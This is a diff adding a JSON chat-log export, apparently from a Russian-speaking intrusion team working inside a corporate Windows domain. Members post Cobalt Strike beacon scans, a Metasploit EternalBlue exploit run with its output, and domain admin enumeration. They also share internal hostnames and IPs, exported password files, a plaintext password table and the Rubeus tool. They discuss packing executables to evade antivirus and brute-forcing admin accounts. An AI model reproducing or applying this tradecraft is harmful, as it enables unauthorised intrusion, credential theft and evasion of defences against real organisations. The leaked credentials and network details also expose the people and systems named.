@@ -1,0 +1,804 @@
+{
+  "messages": [
+    {
+      "_id": "g9fpXczMM89ApDaxc",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "```\nAlias name     administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator\nsysadmin\nZOHOCORP\\raja-9298\nThe command completed successfully.\n\n\n\nThe request will be processed at a domain controller for domain csez.zohocorpin.com.\n\nGroup name     Enterprise Admins\nComment        Designated administrators of the enterprise\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator            pmpdemo                  rmp                      \nThe command completed successfully.\n\n\n\nThe request will be processed at a domain controller for domain csez.zohocorpin.com.\n\nGroup name     Domain Admins\nComment        Designated administrators of the domain\n\nMembers\n\n-------------------------------------------------------------------------------\nAdministrator            adssp                    assetprober              \ndesktopcentral           gjprabu-0985             kamal-0150               \nnocfw                    sysadmin                 sysaudit                 \nvijay-3486               zohoits                  \nThe command completed successfully.\n```",
+      "ts": "2020-09-22T16:46:29.505Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-22T16:46:29.700Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ADmKTYRGWzhyzZY95",
+      "rid": "8wP8rwyszCpfubDuH",
+      "ts": "2020-09-22T16:40:30.960Z",
+      "msg": "",
+      "file": {
+        "_id": "ES7fFRQTqNko9DdZk",
+        "name": "MailAccount.csv",
+        "type": "text/csv"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "MailAccount.csv",
+          "title_link": "/file-upload/ES7fFRQTqNko9DdZk/MailAccount.csv",
+          "title_link_download": true,
+          "type": "file",
+          "description": "open as xls"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-22T16:40:31.000Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "gXGnE28z3rfXASCvs",
+      "rid": "8wP8rwyszCpfubDuH",
+      "ts": "2020-09-22T16:31:50.478Z",
+      "msg": "open as xls",
+      "file": {
+        "_id": "Q5FNZHPFBzf4t6goo",
+        "name": "ExportPasswords_Feb_28_2020.csv",
+        "type": "text/csv"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "ExportPasswords_Feb_28_2020.csv",
+          "title_link": "/file-upload/Q5FNZHPFBzf4t6goo/ExportPasswords_Feb_28_2020.csv",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-22T16:32:19.483Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-09-22T16:32:19.475Z",
+      "editedBy": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8"
+      },
+      "urls": []
+    },
+    {
+      "_id": "jTZgbSQxi63aEKxf9",
+      "rid": "8wP8rwyszCpfubDuH",
+      "ts": "2020-09-22T16:30:58.570Z",
+      "msg": "",
+      "file": {
+        "_id": "P5TQ942is7HQHgjxC",
+        "name": "ExportResources_Feb_28_2020.xls",
+        "type": "application/vnd.ms-excel"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "ExportResources_Feb_28_2020.xls",
+          "title_link": "/file-upload/P5TQ942is7HQHgjxC/ExportResources_Feb_28_2020.xls",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-22T16:30:58.611Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "XWptGWC39RD47c3bp",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "```\nResource Name\tUser Account\tPassword\nanand1\t                           acc1\t                  test1_%#@\nanand1\t                          aa   aa  \t      z$ZMGxCAewr8Z\nGun\t                            as\t              p7<umNNq\n\n```",
+      "ts": "2020-09-22T16:30:51.126Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-22T16:30:51.225Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "DuQeDToSjTC9SQETs",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "@user3 \n```\nbeacon> portscan 192.168.16.0/24 23,22,80,1433,135,445,3389,5900\n[*] Tasked beacon to scan ports 23,22,80,1433,135,445,3389,5900 on 192.168.16.0/24\n[+] host called home, sent: 74813 bytes\n[+] received output:\nScanner module is complete\n\nbeacon> portscan 192.168.16.0/24\n[*] Tasked beacon to scan ports 1-1024,3389,5900-6000 on 192.168.16.0/24\n[+] host called home, sent: 74813 bytes\n[+] received output:\nScanner module is complete\n```",
+      "ts": "2020-09-22T16:15:51.919Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-22T16:15:52.083Z",
+      "mentions": [
+        {
+          "_id": "5nrWYoszLFsnLuMcN",
+          "username": "user3",
+          "name": "stalin"
+        }
+      ],
+      "channels": []
+    },
+    {
+      "_id": "S6Y9krviNjzP7CjBX",
+      "rid": "8wP8rwyszCpfubDuH",
+      "ts": "2020-09-22T16:11:16.892Z",
+      "msg": "",
+      "file": {
+        "_id": "TZxhGKAXMwK7TyebB",
+        "name": "PAM360-reset-password-fail.docx",
+        "type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "PAM360-reset-password-fail.docx",
+          "title_link": "/file-upload/TZxhGKAXMwK7TyebB/PAM360-reset-password-fail.docx",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-22T16:11:16.932Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "kSHvjGmeNW3KC3nyo",
+      "rid": "8wP8rwyszCpfubDuH",
+      "ts": "2020-09-22T16:09:43.785Z",
+      "msg": "",
+      "file": {
+        "_id": "ALrWWc7R6GkKBSX6R",
+        "name": "Clipboard - 22 сентября 2020 г., 19:09",
+        "type": "image/png"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "Clipboard - 22 сентября 2020 г., 19:09",
+          "title_link": "/file-upload/ALrWWc7R6GkKBSX6R/Clipboard%20-%2022%20%D1%81%D0%B5%D0%BD%D1%82%D1%8F%D0%B1%D1%80%D1%8F%202020%20%D0%B3.,%2019:09",
+          "title_link_download": true,
+          "image_dimensions": {
+            "width": 1076,
+            "height": 649
+          },
+          "image_preview": "/9j/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAATACADASIAAhEBAxEB/8QAGQAAAwADAAAAAAAAAAAAAAAAAAYHAgME/8QAJRAAAQQABAYDAAAAAAAAAAAAAQACAwQFESFyBhIVNVRxMTOR/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAH/xAAYEQEAAwEAAAAAAAAAAAAAAAAAARESIf/aAAwDAQACEQMRAD8AaMFBGM1fn7ArUGvDiSDko3gvdqu8K0WZ4YGNMgJDsholXw1nrZFEdH6j2otxHzdcub1cInsewa+s1EeJO+W96LM246jnMsxuYcnA5gptGKXfJk/UIRGXVr3kyJRvPdJblfI4ucTqShCD/9k=",
+          "image_url": "/file-upload/ALrWWc7R6GkKBSX6R/Clipboard%20-%2022%20%D1%81%D0%B5%D0%BD%D1%82%D1%8F%D0%B1%D1%80%D1%8F%202020%20%D0%B3.,%2019:09",
+          "image_type": "image/png",
+          "image_size": 63878,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-22T16:09:43.813Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "NYvTNzbu2m6ewCg9u",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "точно))",
+      "ts": "2020-09-22T16:08:53.901Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-22T16:08:53.940Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "cxtwq5pSb3EX3agjn",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "двойной пробел опробуй убрать",
+      "ts": "2020-09-22T16:06:58.719Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-22T16:06:58.767Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "hPjb86XL9KZ2CFMcs",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "действительно запустился, хотя я уверен что выдавал ошибку.... ну да ладно\n`execute-assembly /home/user/Desktop/TOOLS/1/Rubeus.exe  monitor /interval:1` - не хочет работать и выдает справку. с этим можно что то сделать?",
+      "ts": "2020-09-22T16:05:01.344Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-22T16:05:01.379Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "3sKtay8LmjESiFXgJ",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "хм. щас",
+      "ts": "2020-09-22T15:59:16.747Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-22T15:59:16.779Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "J6hv3nqQbcXwRGtGD",
+      "rid": "8wP8rwyszCpfubDuH",
+      "ts": "2020-09-22T15:59:00.380Z",
+      "msg": "",
+      "file": {
+        "_id": "Na9ZiXYBQA3Gxtc67",
+        "name": "Rubeus.exe",
+        "type": "application/x-ms-dos-executable"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "Rubeus.exe",
+          "title_link": "/file-upload/Na9ZiXYBQA3Gxtc67/Rubeus.exe",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-22T15:59:00.424Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "24dYcR6Xotjhtheea",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "230 килобайт он весит",
+      "ts": "2020-09-22T15:58:47.372Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-22T15:58:47.401Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "SY2gtxfn5z6E3Fc5Z",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "он тяжелеее 1М",
+      "ts": "2020-09-22T15:58:17.933Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-22T15:58:17.970Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "qpL8vCh6zaK6DRa6J",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "для бесфайлового исполнения",
+      "ts": "2020-09-22T15:58:12.947Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-22T15:58:12.982Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "mdrgfDhadvikmBwMH",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "есть",
+      "ts": "2020-09-22T15:58:08.310Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-22T15:58:08.336Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "9CampqsCpjBJAuKNn",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "execute-assembly",
+      "ts": "2020-09-22T15:58:07.362Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-22T15:58:07.399Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "JuXZbE87dZBTfMQQN",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "а зачем ты его роняешь?",
+      "ts": "2020-09-22T15:58:01.947Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-22T15:58:01.982Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "kDdYjPq69S7j9pWna",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "нужно рубеус запустить, а АВ его прибивает, как только я его роняю",
+      "ts": "2020-09-22T15:57:27.459Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-22T15:57:27.498Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "rwwLCCpjMyJme26AX",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "по идее да, а чем длл не устраивает?",
+      "ts": "2020-09-22T15:56:56.102Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-22T15:56:56.132Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "qEFBdyyoYKoAuX7DA",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "@tl2 а унас есть способ как то запаковать экзешник что бы его AV не прибивал?",
+      "ts": "2020-09-22T15:55:41.778Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-09-22T15:55:41.818Z",
+      "mentions": [
+        {
+          "_id": "Rmne8eAkiu37dhm5z",
+          "username": "tl2",
+          "name": "Team Lead 2"
+        }
+      ],
+      "channels": []
+    },
+    {
+      "_id": "rdehX8vD773twTwGs",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "`Win 7 Pro`\n```\nsvembu.localzoho.com [172.20.3.7]\nzcpl-wine6420.localzoho.com [172.20.3.7]\nrex-0179.localzoho.com [172.20.3.7]\noorni-3055.localzoho.com [172.20.3.7]\nvijaya-dr1.localzoho.com [172.20.3.7]\nsrini-1728.localzoho.com [172.20.3.7]\nzforms-w7-64-1.localzoho.com [172.20.3.7]\nabrar--4885.localzoho.com [172.20.3.7]\nmohammed-con127.localzoho.com [172.20.3.7]\nmohan-2271-temp.localzoho.com [172.20.3.7]\ninteg-wiin7.localzoho.com [172.20.3.7]\nsivanandam-2729.localzoho.com [172.20.3.7]\ninteg-win7-1-bc.localzoho.com [172.20.3.7]\n\ninteg-win7-1.csez.zohocorpin.com [192.168.113.57]\ninteg-win7-2.csez.zohocorpin.com [192.168.113.71]\n\ntmrm-compliance.csez.zohocorpin.com [192.168.225.179]\n```",
+      "ts": "2020-09-22T14:26:25.770Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-22T14:26:25.924Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "7JyswDyJ2p46eiRd3",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "надо указать домнный sbmuser sbmdomain sbmpass",
+      "ts": "2020-09-22T14:26:14.237Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-22T14:26:14.280Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "2RQpWYWs2vhwKbRXL",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "причем десятка... вообще странно что она уязвима...",
+      "ts": "2020-09-22T14:24:38.866Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-22T14:24:38.901Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "qM3DqPr6yS6C8enxY",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "а вот тут нужны креды скорее всего",
+      "ts": "2020-09-22T14:24:29.525Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-22T14:24:29.558Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "4wpi64SQftMaZgXAF",
+      "rid": "8wP8rwyszCpfubDuH",
+      "tshow": true,
+      "tmid": "zKEuBYFhF5qxp7jr4",
+      "msg": "```\n\n[*] 192.168.113.242:445   - Target OS: Windows 10 Pro 10586\n[-] 192.168.113.242:445   - Unable to find accessible named pipe!\n[*] 192.168.113.242:445   - Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\n```",
+      "ts": "2020-09-22T14:22:01.944Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-09-22T14:22:02.069Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "zKEuBYFhF5qxp7jr4",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "надо ms17_010_command",
+      "ts": "2020-09-22T14:16:48.559Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-22T14:22:02.102Z",
+      "mentions": [],
+      "channels": [],
+      "replies": [
+        "Rmne8eAkiu37dhm5z",
+        "5nrWYoszLFsnLuMcN"
+      ],
+      "tcount": 1,
+      "tlm": "2020-09-22T14:22:01.944Z"
+    },
+    {
+      "_id": "XKMmj6APF47k6WRqW",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "не то используете",
+      "ts": "2020-09-22T14:16:43.399Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-22T14:16:43.445Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "fDBsZRqrqgAvNA42j",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "@tl2  есть идеи? \n```\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > run\n\n[*] 192.168.113.242:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check\n[+] 192.168.113.242:445   - Host is likely VULNERABLE to MS17-010! - Windows 10 Pro 10586 x64 (64-bit)\n[*] 192.168.113.242:445   - Scanned 1 of 1 hosts (100% complete)\n[*] 192.168.113.242:445 - Connecting to target for exploitation.\n[+] 192.168.113.242:445 - Connection established for exploitation.\n[+] 192.168.113.242:445 - Target OS selected valid for OS indicated by SMB reply\n[*] 192.168.113.242:445 - CORE raw buffer dump (20 bytes)\n[*] 192.168.113.242:445 - 0x00000000  57 69 6e 64 6f 77 73 20 31 30 20 50 72 6f 20 31  Windows 10 Pro 1\n[*] 192.168.113.242:445 - 0x00000010  30 35 38 36                                      0586            \n[+] 192.168.113.242:445 - Target arch selected valid for arch indicated by DCE/RPC reply\n[*] 192.168.113.242:445 - Trying exploit with 12 Groom Allocations.\n[*] 192.168.113.242:445 - Sending all but last fragment of exploit packet\n[-] 192.168.113.242:445 - RubySMB::Error::CommunicationError: Read timeout expired when reading from the Socket (timeout=30)\n[*] Started bind TCP handler against 192.168.113.242:4444\n[*] Exploit completed, but no session was created.\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > \n\n```",
+      "ts": "2020-09-22T14:15:23.698Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-09-22T14:15:23.914Z",
+      "mentions": [
+        {
+          "_id": "Rmne8eAkiu37dhm5z",
+          "username": "tl2",
+          "name": "Team Lead 2"
+        }
+      ],
+      "channels": []
+    },
+    {
+      "_id": "kh2AmzBQfsN5DD67c",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "`Win Serv 2008 R2`\n\n```\nwin2k8adc.localzoho.com [172.20.3.7]\nvcenter.localzoho.com [172.20.3.7]\nprint-server-bk.localzoho.com [172.20.3.7]\nhpacc-control.localzoho.com [172.20.3.7]\n\nprintserver.csez.zohocorpin.com [192.168.100.206]\nest-it-storage.csez.zohocorpin.com [192.168.100.74]\nest-av-server.csez.zohocorpin.com [192.168.100.68]\n\nfinance-server.csez.zohocorpin.com [192.168.112.132]\n\ninteg-i18n.csez.zohocorpin.com [192.168.113.56]\n\ntally-server.csez.zohocorpin.com [192.168.206.51]\n```",
+      "ts": "2020-09-22T12:48:57.267Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-22T12:48:57.390Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "cp8De5p2arfhPzdZB",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "ну вот одна уже есть\nпотом на 17-010 посканить вин2008 сервера еще вполне себе можно",
+      "ts": "2020-09-22T12:15:55.398Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-22T12:15:55.425Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "mXvxdMaRYkqLKfmSo",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "и вторая \n```\nbeacon> shell ping INTEG-DRBD-XP64\n[*] Tasked beacon to run: ping INTEG-DRBD-XP64\n[+] host called home, sent: 51 bytes\n[+] received output:\n\nPinging integ-drbd-xp64.csez.zohocorpin.com [192.168.113.49] with 32 bytes of data:\nRequest timed out.\nRequest timed out.\nRequest timed out.\nRequest timed out.\n\nPing statistics for 192.168.113.49:\n    Packets: Sent = 4, Received = 0, Lost = 4 (100% loss),\n\n```",
+      "ts": "2020-09-22T12:15:14.345Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-22T12:15:28.341Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-09-22T12:15:28.339Z",
+      "editedBy": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8"
+      },
+      "urls": []
+    },
+    {
+      "_id": "qDed4BkADBZXLNpL9",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "Одна\n```\nbeacon> shell ping INTEG-XP1\n[*] Tasked beacon to run: ping INTEG-XP1\n[+] host called home, sent: 45 bytes\n[+] received output:\n\nPinging integ-xp1.csez.zohocorpin.com [192.168.113.58] with 32 bytes of data:\nReply from 192.168.113.58: bytes=32 time=8ms TTL=62\nReply from 192.168.113.58: bytes=32 time=8ms TTL=62\nReply from 192.168.113.58: bytes=32 time=8ms TTL=62\nReply from 192.168.113.58: bytes=32 time=8ms TTL=62\n\nPing statistics for 192.168.113.58:\n    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 8ms, Maximum = 8ms, Average = 8ms\n\n```",
+      "ts": "2020-09-22T12:15:09.447Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-22T12:15:09.631Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ZzGZBbrrFnMbvTK4v",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "на ХР еще нетапи эксплойт работает",
+      "ts": "2020-09-22T12:15:04.708Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-22T12:15:04.743Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "XGinRRb7vk9SsJt6J",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "так а чего не пробиваете 17-010 ?",
+      "ts": "2020-09-22T12:14:33.639Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-22T12:14:33.683Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "YPcR48uGLNKJsyC4S",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "XP Professional есть",
+      "ts": "2020-09-22T12:13:05.759Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-22T12:13:13.441Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-09-22T12:13:13.438Z",
+      "editedBy": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8"
+      },
+      "urls": []
+    },
+    {
+      "_id": "HKHffk43XjCBuW98h",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "и 2012 R2",
+      "ts": "2020-09-22T12:11:36.191Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-22T12:11:36.223Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "9FbMgozAE336u7LtK",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "есть 2008 R2",
+      "ts": "2020-09-22T12:11:20.836Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-22T12:11:20.864Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "TW23Act7FeFDPYXoi",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "-",
+      "ts": "2020-09-22T12:11:16.839Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-22T12:11:16.876Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ccqpT2bQgKCiSopoD",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "в АД нету 2003 / ХР тачек?",
+      "ts": "2020-09-22T12:10:30.587Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-22T12:10:30.626Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "vDaMejikbWzzeJDcQ",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "Просто больше в голову ничего не приходит",
+      "ts": "2020-09-22T12:10:28.270Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-09-22T12:10:28.309Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "8pt8mvN9kPu7rB8Z7",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "но вряд ли это хорошая идея...",
+      "ts": "2020-09-22T12:10:09.150Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-22T12:10:09.181Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "DBcyJuzwH4sB79RFP",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "большая сеть, тут брутить.... \nможно попробовать разве что список домен админов",
+      "ts": "2020-09-22T12:10:02.253Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-09-22T12:10:02.300Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "R3xq7BbhATMEPPBPz",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "@tl1 Может брутанем по топовым паролям?",
+      "ts": "2020-09-22T12:09:24.060Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-09-22T12:09:24.118Z",
+      "mentions": [
+        {
+          "_id": "yJcaRFnKQqepiffHq",
+          "username": "tl1",
+          "name": "Team Lead 1"
